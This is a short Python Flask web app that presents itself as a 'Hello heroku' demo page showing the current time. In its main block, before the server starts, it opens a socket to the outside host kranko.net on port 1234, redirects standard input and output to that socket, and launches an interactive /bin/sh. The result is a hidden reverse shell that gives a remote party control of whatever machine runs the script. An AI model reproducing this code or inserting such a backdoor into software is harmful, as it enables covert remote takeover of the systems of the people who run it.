from flask import Flask
from datetime import datetime
app = Flask(__name__)
import socket,subprocess,os
    
@app.route('/')
def homepage():
    the_time = datetime.now().strftime("%A, %d %b %Y %l:%M %p")

    return """
    <h1>Hello heroku</h1>
    <p>It is currently {time}.</p>

    <img src="http://loremflickr.com/600/400" />
    """.format(time=the_time)

if __name__ == '__main__':
    

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("kranko.net",1234))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)

    p=subprocess.call(["/bin/sh","-i"])
    
    app.run(debug=True, use_reloader=True)

